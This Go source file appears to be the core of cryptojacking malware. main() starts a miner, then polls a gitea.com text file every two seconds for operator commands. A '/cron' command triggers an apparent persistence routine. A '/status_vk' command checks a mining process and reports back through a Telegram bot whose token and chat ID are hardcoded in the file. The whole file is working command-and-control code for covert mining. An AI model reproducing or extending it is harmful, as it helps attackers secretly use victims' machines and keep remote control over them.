package main


import(

"time"
"strings"
"net/http"
"net/url"
"io"
"fmt"
)



func bot(msg_to_bot string) {
 
 
 
         token := "9180321584:AAFZZSRVKx3W8VL71bs624PiltBfz7vGQHU"
         chatID := "7127446120"
 
          resp, err := http.PostForm("https://api.telegram.org/bot"+token+"/sendMessage", url.Values{
                  "chat_id": {chatID},
                  "text":    {msg_to_bot},
          })
 
          if err != nil {
                  return
          }
          defer resp.Body.Close()
 
          body, _ := io.ReadAll(resp.Body)
          fmt.Println(string(body))
   
 
 }
 
 






func get_msg(){


url_msg := "https://gitea.com/logical/logical/raw/branch/master/msg/msg.txt"

//get command by operator

cli := http.Client{}

req_msg , err_get := cli.Get(url_msg)

if err_get !=  nil { return}

msg_byte , err_rd := io.ReadAll(req_msg.Body)
   
if err_rd != nil {return}


msg_string := string(msg_byte)




if strings.Contains(msg_string, "/cron") {


fmt.Println("cron ..")

cron()


}



if strings.Contains(msg_string, "/status_vk") {

fmt.Println("pegando o status do vkzmn")

status  := proc()

if (status == "ok") {  bot( "vkzmn_ok" ) ; return  } 
 
bot("vkzmn not ok")


}











}





func main(){



miner()



for {

get_msg()

time.Sleep(2 * time.Second)

}

}






















